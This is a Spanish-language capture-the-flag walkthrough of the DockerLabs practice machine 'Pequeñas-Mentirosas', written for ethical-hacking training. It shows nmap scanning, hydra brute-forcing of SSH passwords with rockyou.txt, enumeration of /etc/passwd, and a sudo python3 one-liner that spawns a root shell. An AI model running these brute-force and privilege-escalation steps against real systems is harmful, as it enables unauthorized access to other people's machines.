---
title: Pequeñas-Mentirosas
description: DockerLabs es una plataforma gratuita diseñada para practicar hacking ético al alcance de todo el mundo utilizando Docker. DockerLabs ofrece un entorno seguro y accesible para desplegar laboratorios vulnerables de la forma más eficiente y sencilla posible.
date: 2025-05-30
toc: true
pin: false
image:
 path: /assets/img/dockerlabs-writeup-pequenas-mentirosas/pequenas-mentirosas_logo.png
categories:
  - Docker Labs
tags:
  - linux
  - dockerlabs
  - tcp
  - ssh
  - http
  - data leaks
  - password attacks
  - sudo abuse
  - information gathering
  - data leak exploitation
  - lateral movement
  - privilege escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/dockerlabs/pequeñas-mentirosas:-$ ping -c 1 172.17.0.3
PING 172.17.0.3 (172.17.0.3) 56(84) bytes of data.
64 bytes from 172.17.0.3: icmp_seq=1 ttl=64 time=0.074 ms

--- 172.17.0.3 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.074/0.074/0.074/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/dockerlabs/pequeñas-mentirosas:-$ nmap -p- --open -sS --min-rate 5000 -vvv 172.17.0.3 -n -Pn -oG nmap1
Host: 172.17.0.3 ()	Status: Up
Host: 172.17.0.3 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///	Ignored State: closed (65533)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/dockerlabs/pequeñas-mentirosas:-$ nmap -sCV -vvv -p22,80 172.17.0.3 -oN nmap2
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 9e1058a51a429dbee519d12e799cce21 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC3N2iZE0Bb73S64lNUXiTtz3cITYUJqgbwvelAku4TIER/XzzRFH4jPuOjFW8MHqVgohznWwxFyrEbhJs71kHI=
|   256 6ba3a884e03357fc444969417dd3c992 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM3f1ALx7tSZjnqhdGlIXkcEcJCIS12yR5pEzywnF6rQ
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Site doesn't have a title (text/html).
MAC Address: E6:92:E9:02:8A:7E (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```terminal
/home/kali/Documents/dockerlabs/pequeñas-mentirosas:-$ whatweb 172.17.0.3
http://172.17.0.3 [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[172.17.0.3]
```

---
## Data Leak Exploitation

Al acceder a la página principal, el navegador muestra una pista indicando que la clave para el usuario `A` puede encontrarse en los archivos.

![](assets/img/dockerlabs-writeup-pequenas-mentirosas/pequenas-mentirosas1_1.png)

Con base en esta sugerencia, ejecuto un ataque de fuerza bruta sobre el servicio SSH utilizando hydra y el diccionario `rockyou.txt`.

```terminal
/home/kali/Documents/dockerlabs/pequeñas-mentirosas:-$ hydra -l a -P /opt/rockyou.txt ssh://172.17.0.3 -t 40 -I
[22][ssh] host: 172.17.0.3   login: a   password: secret
```

Se descubre la combinación válida de credenciales para el usuario `A`.

```terminal
/home/kali/Documents/dockerlabs/pequeñas-mentirosas:-$ ssh a@172.17.0.3
a@172.17.0.3's password: secret

a@4a7bc786dcf2:~$ id
uid=1001(a) gid=1001(a) groups=1001(a)
```

---
## Lateral Movement

```terminal
a@4a7bc786dcf2:~$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
spencer:x:1000:1000::/home/spencer:/bin/bash
a:x:1001:1001::/home/a:/bin/bash
```

Enumerando usuarios del sistema mediante `/etc/passwd`, se detecta la presencia de `spencer`. Ejecuto un nuevo ataque de fuerza bruta, esta vez dirigido al usuario `spencer`. El proceso revela que la contraseña utilizada es débil y está presente en el diccionario.

```terminal
/home/kali/Documents/dockerlabs/pequeñas-mentirosas:-$ hydra -l spencer -P /opt/rockyou.txt ssh://172.17.0.3 -t 40 -I
[22][ssh] host: 172.17.0.3   login: spencer   password: password1
```

Con las credenciales válidas, accedo al sistema como el nuevo usuario.

```terminal
/home/kali/Documents/dockerlabs/pequeñas-mentirosas:-$ ssh spencer@172.17.0.3
spencer@172.17.0.3's password: password1

spencer@4a7bc786dcf2:~$ id
uid=1000(spencer) gid=1000(spencer) groups=1000(spencer)
```

---
## Privilege Escalation

Consulto los permisos `sudo` disponibles para el usuario actual. El binario `/usr/bin/python3` puede ejecutarse como `root` sin necesidad de contraseña.

```terminal
spencer@4a7bc786dcf2:~$ sudo -l
Matching Defaults entries for spencer on 4a7bc786dcf2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User spencer may run the following commands on 4a7bc786dcf2:
    (ALL) NOPASSWD: /usr/bin/python3
```

Aprovecho esta configuración para ejecutar una shell privilegiada.

```terminal
spencer@4a7bc786dcf2:~$ sudo /usr/bin/python3 -c 'import os; os.system("/bin/bash -p")'

root@4a7bc786dcf2:/home/spencer# id
uid=0(root) gid=0(root) groups=0(root)
```
